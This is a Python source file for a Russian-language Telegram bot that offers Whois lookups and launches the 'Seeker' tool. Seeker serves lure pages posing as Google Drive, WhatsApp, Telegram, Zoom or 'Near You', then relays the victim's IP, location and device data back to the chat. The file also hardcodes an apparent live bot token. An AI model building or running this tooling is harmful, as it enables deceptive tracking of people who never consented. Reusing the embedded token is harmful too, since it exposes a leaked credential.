import threading

import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from commonOptions import start  # Import the start function
from commonOptions import show_menu  # Import the show_menu function
from handle_whois import handle_whois  # Import the handle_whois function
from seekerServer import seekServer  # Import the seekServer function
from seekerSelect import template_seeker_select  # Import the template_seeker_select function
from seekerDataParser import seeker_data_parser  # Import the seeker_data_parser function

#!====================================
import sys
import argparse
from os import path, kill
from json import loads
from packaging import version

parser = argparse.ArgumentParser()
parser.add_argument('-p', '--port', type=int, default=4001, help='Web server port [ Default : 8080 ]')

args = parser.parse_args()
port = args.port

path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
SERVER_PROC = ''
INFO = f'{path_to_script}/seeker/logs/info.txt'
RESULT = f'{path_to_script}/seeker/logs/result.txt'
TEMPLATES_JSON = f'{path_to_script}/seeker/template/templates.json'
LOG_FILE = f'{path_to_script}/seeker/logs/php.log'

from time import sleep
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM



def wait(bot, chat_id, cl_quit, SERVER_PROC):
	printed = False
	while True:
		sleep(2)
		size = path.getsize(RESULT)
		if size == 0 and printed is False:
			print(f'[+] Waiting for Client...[ctrl+c to exit]\n')
			printed = True
		if size > 0:
			seeker_data_parser(INFO, loads, ip_address, RESULT, clear, bot, chat_id, cl_quit, SERVER_PROC)
			printed = False


def clear():
	with open(RESULT, 'w+'):
		pass
	with open(INFO, 'w+'):
		pass


def repeat():
	clear()
	wait()


def cl_quit(proc):
	clear()
	if proc:
		kill(proc.pid, SIGTERM)
	sys.exit()
#!=============================================

# Replace with your bot token
TOKEN = "6618317228:AAHJENt4uNJ6h773Oow1RRdeNTehs8tg4qs"
bot = telebot.TeleBot(TOKEN)

# Dictionary to store conversation states
conversation_states = {}


@bot.message_handler(commands=['start'])
def handle_start(message):
    start(bot, message)


@bot.message_handler(commands=['menu'])
def menu(message):
    chat_id = message.chat.id  # Get the chat ID from the message object
    show_menu(bot, chat_id)


@bot.callback_query_handler(func=lambda query: True)
def handle_callback_query(query):
    global SITE
    chat_id = query.message.chat.id
    message_id = query.message.message_id

    if query.data == "show_tools":
        tools_text = "Выберите категорию:"

        keyboard = InlineKeyboardMarkup(row_width=1)
        sites_button = InlineKeyboardButton(
            text="Сайты", callback_data="sites")
        keyboard.add(sites_button)

        bot.edit_message_text(tools_text, chat_id=chat_id,
                              message_id=message_id, reply_markup=keyboard)

    elif query.data == "sites":
        tools_text = "Сайты"

        keyboard = InlineKeyboardMarkup(row_width=1)
        whois_button = InlineKeyboardButton(
            text="Whois", callback_data="whois")
        seeker_button = InlineKeyboardButton(
            text="Seeker", callback_data="seeker")
        keyboard.add(whois_button)
        keyboard.add(seeker_button)

        bot.edit_message_text(tools_text, chat_id=chat_id,
                              message_id=message_id, reply_markup=keyboard)

    elif query.data == "whois":
        # Set conversation state to "waiting_for_user_input"
        if chat_id not in conversation_states:
            conversation_states[chat_id] = {}

        conversation_states[chat_id]["whois_input"] = "waiting_for_user_input"
        whois_description = (
            "📄 Whois - это утилита или сервис, который предоставляет информацию о регистрации доменных имен. "
            "Он позволяет получить данные о владельце домена, контактные данные, даты регистрации и другие сведения.\n\n"
            "Чтобы воспользоваться данным сервисом введите доменное имя без протокола либо его IP адрес:"
        )

        bot.send_message(chat_id=chat_id, text=whois_description)

    elif query.data == "seeker":
        if chat_id not in conversation_states:
            conversation_states[chat_id] = {}

        # Set conversation state to "waiting_for_user_input"
        # conversation_states[chat_id] = "waiting_for_user_input"
        conversation_states[chat_id]["seeker_input"] = "waiting_for_user_input"
        tools_text = ("📄 Seeker — это мощный инструмент с открытым исходным кодом, доступный в Kali Linux, который облегчает процесс отслеживания и поиска устройств, файлов и онлайн-ресурсов с использованием различных методов, таких как IP-геолокация, отслеживание браузера и другие методы."
                      "\n\nSeeker предназначен как для этического взлома, так и для целей тестирования на проникновение, позволяя специалистам по безопасности собирать информацию о целях для оценки уязвимости."
                      "\n\n📌 Выберите шаблон:")
        clear()

        keyboard = InlineKeyboardMarkup(row_width=1)
        near_button = InlineKeyboardButton(
            text="Near You", callback_data="near_you")
        google_button = InlineKeyboardButton(
            text="Google Drive", callback_data="google_drive")
        wahtsapp_button = InlineKeyboardButton(
            text="WhatsApp", callback_data="whatsapp")
        whatsapp_red_button = InlineKeyboardButton(
            text="WhatsApp Redirect", callback_data="whatsapp_red")
        telegram_button = InlineKeyboardButton(
            text="Telegram", callback_data="telegram")
        zoom_button = InlineKeyboardButton(
            text="Zoom", callback_data="zoom")
        keyboard.add(near_button)
        keyboard.add(google_button)
        keyboard.add(wahtsapp_button)
        keyboard.add(whatsapp_red_button)
        keyboard.add(telegram_button)
        keyboard.add(zoom_button)


        bot.edit_message_text(tools_text, chat_id=chat_id,
                              message_id=message_id, reply_markup=keyboard)

    elif query.data == "near_you":
          bot.send_message(chat_id, "Идет запуск сервера, пожалуйста, подождите!")
          SITE = template_seeker_select(SITE, TEMPLATES_JSON, loads, 0)
          SERVER_PROC = seekServer(LOG_FILE, port, SITE, subp, sleep, cl_quit, bot, chat_id)
          wait(bot, chat_id, cl_quit, SERVER_PROC)
          seeker_data_parser(INFO, loads, ip_address, RESULT, clear, bot, chat_id, cl_quit, SERVER_PROC)




@bot.message_handler(func=lambda message: conversation_states.get(message.chat.id, {}).get("whois_input") == "waiting_for_user_input")
def handle_user_input(message):
    handle_whois(bot, message, conversation_states)


@bot.message_handler(commands=['help'])
def help_command(message):
    bot.send_message(
        message.chat.id, "Available commands:\n/start - Start the bot\n/help - Show this help message")

bot.polling()
# def start_bot_and_server():
#     print("Bot is running!")
#     # Start the Telegram bot
#     bot.polling()

# # Create a thread for the bot and server tasks
# bot_server_thread = threading.Thread(target=start_bot_and_server)

# # Start the bot and server thread
# bot_server_thread.start()

# bot_server_thread.join()

